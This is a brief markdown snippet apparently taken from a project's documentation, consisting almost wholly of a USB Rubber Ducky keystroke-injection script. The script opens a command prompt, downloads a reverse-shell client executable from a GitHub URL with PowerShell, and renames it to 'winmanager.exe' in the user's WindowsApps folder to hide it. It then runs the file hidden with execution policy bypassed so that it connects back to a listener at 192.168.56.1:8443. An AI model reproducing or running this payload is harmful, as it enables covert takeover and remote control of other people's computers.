## Using rubber-ducky scripts

Downloading and executing a file:
```shell
GUI r
SLEEP 1000
STRING cmd
ENTER
SLEEP 1000
ENTER
STRING powershell.exe (New-Object System.Net.WebClient).DownloadFile('https://github.com/derstolz/flask-reverse-shell/raw/master/dist/client64.exe', 'client64.exe');
SLEEP 5000
STRING move client64.exe %USERPROFILE%/AppData/Local/Microsoft/WindowsApps/winmanager.exe
ENTER
STRING powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass cmd.exe /c "%USERPROFILE%/AppData/Local/Microsoft/WindowsApps/winmanager.exe --hostname 192.168.56.1:8443"
ENTER
STRING exit
ENTER
```
